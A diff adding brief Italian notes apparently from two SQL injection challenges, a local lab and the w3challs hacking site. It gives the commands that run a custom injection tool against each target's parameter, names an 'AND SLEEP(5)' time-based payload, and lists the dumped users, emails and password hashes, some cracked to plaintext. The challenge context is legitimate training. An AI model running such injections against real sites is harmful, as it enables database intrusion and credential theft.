@@ -1,0 +1,44 @@
+Prima Challenge:
+
+comando da lanciare: python tool.py http://192.168.33.10/sqli/time_based_blind.php get 'email=arthur@guide.com'
+
+dati estratti:
+1
+Arthur
+Dent
+arthur@guide.com
+d00ee262cdcbe7543210bb85f6f1cac257b4e994
+2
+Ford
+Prefect
+ford@guide.com
+30f5cc99c17426a0d28acf8905c6d776039ad022
+3
+Tricia
+McMillan
+tricia@guide.com
+bcb3358e273b5772ee0ae1799b612e13cc726b04
+4
+Zaphod
+Beeblebrox
+zaphod@guide.com
+0c38530eaca4dbc0f49c459c0c52b362f14215c3
+
+
+Seconda Challenge:
+
+Nella pagina http://vip.hacking.w3challs.com/index.php?page=contact abbiamo notato che era possibile fare injection del tipo AND SLEEP(5) ispezionando il codice html nel campo destin, da li abbiamo sviluppato l'injection
+
+comando da lanciare: python tool.py http://vip.hacking.w3challs.com/index.php?page=contact post 'destin=1&&msg=ddd'
+
+dati estratti:
+1
+Fr4Ger
+b5c0b187fe309af0f4d35982fd961d7e -> love
+2
+LuG3R
+4188679c1d8a284ccc41a6b601869e05 -> kiss 
+3
+K1LLeR
+X31700427b70a87b0203a7d78a85c0da -> smack
+
